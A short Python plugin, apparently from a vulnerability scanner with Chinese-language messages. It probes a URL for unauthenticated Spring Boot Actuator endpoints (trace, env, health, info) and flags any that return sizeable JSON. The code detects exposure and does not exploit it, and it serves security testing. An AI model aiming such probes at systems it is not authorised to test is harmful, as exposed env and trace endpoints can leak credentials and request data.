#!/usr/bin/env python3

'''
name: Spring Actuator未授权漏洞
description: Spring Actuator未授权漏洞
'''

from app.lib.utils.request import request


class Spring_Actuator_Unauthorized_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.headers = {
            "User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
        }
        self.payload = ['trace','env','health','info']

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        for i in self.payload:
            check_url  = '{}/{}'.format(self.url, i)
            try:
                req = request.get(check_url, headers = self.headers)
                if req.headers['Content-Type'] and 'application/json' in req.headers['Content-Type'] and len(req.content)> 500:
                    print('存在Spring Actuator未授权访问漏洞')
                    return True
            except Exception as e:
                print(e)
            finally:
                pass
        print('不存在Spring Actuator未授权访问漏洞')
        return False

if __name__ == '__main__':
    Spring_Actuator_Unauthorized = Spring_Actuator_Unauthorized_BaseVerify('http://10.4.16.3:8082/actuator')
    Spring_Actuator_Unauthorized.run()